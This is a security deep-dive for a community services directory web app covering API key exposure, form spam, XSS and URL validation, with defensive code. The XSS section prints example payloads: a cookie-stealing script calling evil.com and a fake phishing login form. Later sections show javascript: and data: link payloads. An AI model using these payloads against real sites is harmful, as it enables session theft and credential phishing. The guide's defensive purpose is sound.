# Security Concerns — Deep Dive

Detailed explanation of security issues for the Ukrainians in Texas MVP.

---

## 1. Airtable API Key Exposure

### Status: ✅ RESOLVED

Using **Vercel serverless functions** as an API proxy. Airtable credentials are stored server-side only.

### The Original Problem

If we had used `VITE_` prefixed environment variables:

```env
VITE_AIRTABLE_API_KEY=your_api_key  # ❌ Would be exposed!
VITE_AIRTABLE_BASE_ID=your_base_id
```

In Vite, any variable prefixed with `VITE_` gets **bundled into the JavaScript** that runs in the browser. Anyone could:

1. Open browser DevTools
2. Go to Network tab or Sources tab
3. Search for the API key
4. Copy it and use it themselves

### The Risk

**Data Theft:**

- Anyone with your API key can read ALL your Airtable data, including:
  - Unapproved submissions (with personal phone/email)
  - Any internal notes you add
  - The entire database structure

**Data Manipulation:**

- They can create fake listings (spam, offensive content, competitor sabotage)
- They can modify existing listings (change phone numbers to scam lines)
- They can delete all your data

**Cost:**

- Airtable has API rate limits. Malicious users could exhaust your limits.
- If you're on a paid plan, they could rack up usage costs.

**Real-World Example:**
This is not theoretical. Bots actively scrape JavaScript bundles looking for exposed API keys. There are even tools like `trufflehog` and `gitleaks` that automate this. Your key could be found within hours of deployment.

### The Recommendation

**Option A: Serverless API Proxy (Recommended)**

Create a simple backend that sits between your React app and Airtable:

```
React App → Your Serverless Function → Airtable
```

Your API key lives only on the server, never in the browser.

**Vercel Example:**

Create `/api/services.js`:

```javascript
// This runs on the server, not in the browser
export default async function handler(req, res) {
  const response = await fetch(
    `https://api.airtable.com/v0/${process.env.AIRTABLE_BASE_ID}/Services`,
    {
      headers: {
        Authorization: `Bearer ${process.env.AIRTABLE_API_KEY}`, // No VITE_ prefix!
      },
    }
  );

  const data = await response.json();

  // Only return approved listings
  const approved = data.records.filter(r => r.fields.approved);

  res.json(approved);
}
```

**Netlify Example:**

Create `/netlify/functions/services.js`:

```javascript
exports.handler = async (event, context) => {
  const response = await fetch(
    `https://api.airtable.com/v0/${process.env.AIRTABLE_BASE_ID}/Services`,
    {
      headers: {
        Authorization: `Bearer ${process.env.AIRTABLE_API_KEY}`,
      },
    }
  );

  const data = await response.json();

  return {
    statusCode: 200,
    body: JSON.stringify(data.records.filter(r => r.fields.approved)),
  };
};
```

**Option B: Airtable Shared View (Read-Only Alternative)**

For read operations only, you can use Airtable's "Share view" feature which provides a public JSON endpoint without exposing your API key. Limited but simple.

**Option C: Use a Backend-as-a-Service**

Services like Supabase, Firebase, or Xano can act as your backend with proper authentication, so you never expose raw database credentials.

---

## 2. Form Spam

### Status: ✅ RESOLVED

Using **Google Forms** for service submissions instead of a custom form.

### Why This Works

Google Forms includes built-in spam protection:

- **reCAPTCHA** — Automatically enabled on all Google Forms
- **Rate limiting** — Google handles abuse detection
- **No custom code** — Nothing to implement or maintain

### The Original Risk (No Longer Applicable)

If we had built a custom form, we would face:

- Bot spam (thousands of fake entries)
- Competitor sabotage
- Moderation burden
- Database pollution

### Current Flow

1. User clicks "Add service" → opens Google Form in new tab
2. Google handles spam protection automatically
3. Responses saved to Google Sheets
4. Admin imports to Airtable and reviews manually

No custom spam protection code needed.

---

## 3. XSS Vulnerabilities (Cross-Site Scripting)

### The Issue

Users submit text content (business name, description) that you display on the page. If you render this content without sanitization, malicious users can inject JavaScript code that executes in other users' browsers.

### The Risk

**Session Hijacking:**

```html
<!-- Malicious description submitted -->
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>
```

If this renders, every visitor's cookies get sent to the attacker.

**Phishing:**

```html
<!-- Inject a fake login form -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;">
  <h1>Session Expired</h1>
  <form action="https://evil.com/phish">
    <input name="email" placeholder="Email">
    <input name="password" type="password" placeholder="Password">
    <button>Login</button>
  </form>
</div>
```

**Defacement:**

- Inject offensive images or text
- Redirect all visitors to another site
- Display fake error messages

**Malware Distribution:**

- Inject scripts that download malware
- Crypto mining scripts that use visitors' CPU

**Real-World Example:**
XSS is consistently in the OWASP Top 10 vulnerabilities. Major sites like Twitter, Facebook, and eBay have had XSS vulnerabilities exploited.

### The Recommendation

**React's Built-in Protection:**

Good news: React escapes content by default. This is safe:

```jsx
// Safe - React escapes the content
<p>{service.description}</p>
```

This renders the literal text `<script>alert('xss')</script>`, not executable code.

**The Danger Zone: `dangerouslySetInnerHTML`**

Never do this with user content:

```jsx
// DANGEROUS - Never do this!
<div dangerouslySetInnerHTML={{ __html: service.description }} />
```

**If You Need Rich Text (Links, Bold, etc.):**

Use a sanitization library:

```bash
npm install dompurify
```

```jsx
import DOMPurify from 'dompurify';

// Sanitize before rendering
const cleanHTML = DOMPurify.sanitize(service.description, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
  ALLOWED_ATTR: ['href'],
});

<div dangerouslySetInnerHTML={{ __html: cleanHTML }} />
```

**Additional Protections:**

1. **Content Security Policy (CSP) Header:**

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

Prevents inline scripts even if XSS exists.

1. **Sanitize on Input AND Output:**

- Clean data when it's submitted (backend)
- Clean data when it's displayed (frontend)
- Defense in depth

1. **Avoid `eval()`, `new Function()`, `innerHTML`:**
Never use these with user data.

**Recommended Approach for MVP:**

- Stick to React's default escaping (no `dangerouslySetInnerHTML`)
- If you need to display URLs, validate them (see next section)
- Add CSP headers when you deploy

---

## 4. URL Validation

### The Issue

Users submit URLs for their website, Instagram, Facebook, LinkedIn, and Messenger. These URLs are rendered as clickable links. Without validation, malicious URLs can be submitted.

### The Risk

**JavaScript Protocol Attacks:**

```html
<a href="javascript:alert(document.cookie)">Click here</a>
```

If someone submits `javascript:alert('xss')` as their "website", clicking it executes code.

**Phishing Links:**

- Submit legitimate-looking but fake URLs
- `https://instagram.com.evil.com/fake-profile`
- `https://faceb00k.com/phishing-page`

**Malware Distribution:**

- Links to drive-by download sites
- Links that trigger malware downloads

**Reputation Damage:**

- Links to offensive or illegal content
- Your site appears to endorse the linked content

**Data Protocol Attacks:**

```html
<a href="data:text/html,<script>alert('xss')</script>">Link</a>
```

The `data:` protocol can embed executable content.

### The Recommendation

**Step 1: Protocol Whitelist**

Only allow `http://` and `https://`:

```javascript
function isValidURL(url) {
  if (!url) return true; // Optional field

  try {
    const parsed = new URL(url);
    return ['http:', 'https:'].includes(parsed.protocol);
  } catch {
    return false;
  }
}

// Usage
if (!isValidURL(formData.website)) {
  setError('website', 'Please enter a valid URL starting with http:// or https://');
}
```

**Step 2: Domain Validation for Social Links**

For Instagram, Facebook, etc., validate the domain:

```javascript
const SOCIAL_DOMAINS = {
  instagram: ['instagram.com', 'www.instagram.com'],
  facebook: ['facebook.com', 'www.facebook.com', 'fb.com'],
  linkedin: ['linkedin.com', 'www.linkedin.com'],
  messenger: ['m.me', 'messenger.com', 'www.messenger.com'],
};

function isValidSocialURL(url, platform) {
  if (!url) return true;

  try {
    const parsed = new URL(url);
    const validDomains = SOCIAL_DOMAINS[platform];
    return validDomains.some(domain => parsed.hostname === domain);
  } catch {
    return false;
  }
}

// Usage
if (!isValidSocialURL(formData.instagram, 'instagram')) {
  setError('instagram', 'Please enter a valid Instagram URL');
}
```

**Step 3: Use `rel="noopener noreferrer"` on External Links**

Prevents the linked page from accessing your page:

```jsx
<a
  href={service.website}
  target="_blank"
  rel="noopener noreferrer"
>
  {service.website}
</a>
```

**Step 4: Display Domain Only (UX + Security)**

Instead of showing the full URL, show just the domain:

```jsx
function getDomain(url) {
  try {
    return new URL(url).hostname.replace('www.', '');
  } catch {
    return url;
  }
}

// Renders "example.com" instead of "https://www.example.com/long/path?query=string"
<a href={service.website} target="_blank" rel="noopener noreferrer">
  {getDomain(service.website)}
</a>
```

**Step 5: Backend Validation (Defense in Depth)**

Even with frontend validation, validate again on the backend:

```javascript
// In your serverless function
function validateSubmission(data) {
  const errors = [];

  if (data.website && !isValidURL(data.website)) {
    errors.push('Invalid website URL');
  }

  if (data.instagram && !isValidSocialURL(data.instagram, 'instagram')) {
    errors.push('Invalid Instagram URL');
  }

  // ... other validations

  return errors;
}
```

**Recommended Approach for MVP:**

1. Frontend: Validate protocol (http/https only)
2. Frontend: Validate social domains
3. Frontend: Use `rel="noopener noreferrer"` on all external links
4. Backend: Re-validate all URLs before saving

---

## Summary: Security Implementation Priority

| Priority | Issue | Effort | Status |
|----------|-------|--------|--------|
| 1 | API Key Exposure | Medium (serverless function) | ✅ Vercel API proxy |
| 2 | Form Spam | None (using Google Forms) | ✅ Google reCAPTCHA |
| 3 | XSS | Low (React default behavior) | ✅ React escaping |
| 4 | URL Validation | Low (validation functions) | ⚠️ Validate on render |

**Minimum Viable Security for MVP:**

1. ✅ Move Airtable calls to a serverless function (Vercel)
2. ✅ Use Google Forms for submissions (built-in spam protection)
3. ✅ Don't use `dangerouslySetInnerHTML`
4. ⚠️ Validate URLs are http/https only when rendering
5. ⚠️ Add `rel="noopener noreferrer"` to external links

Items 1-3 are already addressed by the architecture. Items 4-5 should be implemented when building the frontend.
